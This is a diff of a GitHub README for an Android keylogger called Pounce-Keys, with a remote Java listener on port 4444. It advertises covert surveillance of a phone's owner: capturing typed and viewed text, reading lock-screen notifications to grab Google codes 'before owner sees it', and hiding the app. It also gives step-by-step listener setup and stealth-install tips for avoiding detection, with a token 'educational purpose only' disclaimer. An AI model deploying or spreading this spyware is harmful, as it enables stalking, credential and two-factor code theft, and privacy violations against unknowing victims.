@@ -1,25 +1,50 @@
-![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com) ![GitHub Repo stars](https://img.shields.io/github/stars/kreabyte/pounce-keys?style=social)  
-
-# thank you for the 8th star :) ⭐ ![image](https://user-images.githubusercontent.com/28081004/215366065-51869c9c-e271-4063-93f5-f6557c62b5b4.png)
-TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list
+![GitHub Repo stars](https://img.shields.io/github/stars/kreabyte/pounce-keys?style=social) ![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys)    
 
 
+<!-- PROJECT LOGO -->
+<br />
+<div align="center">
+  <a href="https://github.com/KreaByte/pounce-keys">
+    <img src="images/logo.png" alt="Logo" width="150" height="150">
+  </a>
 
-![Linode](https://img.shields.io/badge/Supports-Linode-green)
+  <h3 align="center">POUNCE-KEYS</h3>
 
-![Linode](https://img.shields.io/badge/Kali-Linux-blue)
+  <p align="center">
+    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️
+    <br />
+    <a href="https://github.com/KreaByte/pounce-keys/releases">View Release</a>
+    ·
+    <a href="https://ko-fi.com/kreabyte">Support Me</a>
+    ·
+    <a href="https://github.com/KreaByte/pounce-keys/issues">Request Feature</a>
+  </p>
+</div>
 
-seeing these 7 stars and downloads and views makes all of this very worth it to be able to share this with you awesome people
-Pounce Keys 100% working build!
-now works in kali linux on linode, just "sudo ufw allow 4444" then run the jar before upgrading jdk, see bellow.
-delay in listener is only due to recording
+
+
+  
+ 
+
+
+
+
+
+
+
+
+
+
 
 
 ![pounceDemo](https://user-images.githubusercontent.com/28081004/215348652-8bd13319-4622-4b77-9ef6-0fd92a1c95cb.gif) ![demo](https://user-images.githubusercontent.com/28081004/215348661-c424c112-188b-4b9a-9066-2cf7185fecae.gif)
 
+delay in listener is only due to recording
 
 
-# Listener Features
+
+
+# Listener Features ![Linode](https://img.shields.io/badge/Supports-Linode-green)  ![Linode](https://img.shields.io/badge/Kali-Linux-blue)
 
 ✅ reads hidden notifications in locked state (grabs google code before owner sees it)
 
@@ -43,22 +68,31 @@ delay in listener is only due to recording
 
 ✅ logs date and time AND SAVES THEM
 
+# quick use
 
 
-# works on lock screen
-![Screenshot_20230121_091918](https://user-images.githubusercontent.com/28081004/213873094-bc139731-67c2-4190-af5d-c57d3b4bdf6f.png)
+jdk19 
 
-no need to build ip or port into apk before install
+```
+wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.deb
 
-project (keylogger not my own custom listener) was originally built in a AIDE (mobile app dev) using an old 2.2 Gradle build on max API 21
+sudo apt-get -qqy install ./jdk-19_linux-x64_bin.deb
 
-this version was built in android studio electric eel 2022.1.1 with Gradle updated to 7.6 and API all the way up to 33 (android 13)
+sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-19/bin/java 1919
+```
 
-More than just a keylogger, this app prints most text in whatever active section was tapped or opened/viewed, this is how it can show recieved messages.
-think of this as a text based VNC as it sends all that is tapped on the phone
+```
+git clone https://github.com/KreaByte/pounce-keys.git
+cd pounce-keys/Listener/java
+java -jar MessageListener.jar
+sudo ufw allow 4444 "if on linode or on WAN"
+```
+
+
 
 
 # STEALTH
+TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiiden icon in some cases
 
 due to new security features android API 29 and above (Oreo and up I believe) it will make it hard to near impossible to hide the app without root.
 The stealth version does not allow the app to be open, just a white icon, and it just opens the app details menu, sits in the app drawer.
@@ -89,13 +123,7 @@ make sure where you got the file from via web browser and or file manager has ac
 open accessibility settings and enable keylogger or BatteryHealth
 no manual fix.dat required
 
-for linux
-jdk19 
-wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.deb
 
-sudo apt-get -qqy install ./jdk-19_linux-x64_bin.deb
-
-sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-19/bin/java 1919
 
 # Stealth install
 
@@ -145,11 +173,12 @@ check app folders in android for a key folder or a fix.dat file
 
 
 # Donate![icon](https://user-images.githubusercontent.com/28081004/214497772-e0d74e0c-66ca-4e1c-a88f-d0709b62890d.png)💜
+thank you for the 8th star :)⭐
 
 
 I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
 5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
-android-keylogger tag :) java listener is 1 of a kind, original content without forks.
+android-keylogger tag :) java listener is 1 of a kind, original content without forks. Wow 8 stars! thank you guys so much, glad to announce WAN support.
 
 If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
 
@@ -166,4 +195,4 @@ https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=sea
    https://www.freepik.com/free-vector/cute-cat-computer-with-mouse-cartoon-vector-icon-illustration-animal-technology-icon-concept-isolated-premium-vector-flat-cartoon-style_18537569.htm#query=cat%20keyboard&position=1&from_view=search&track=sph#position=1&query=cat%20keyboard
 https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm
 
-
+⚖️ Legal Disclaimer: For Educational Purpose Only
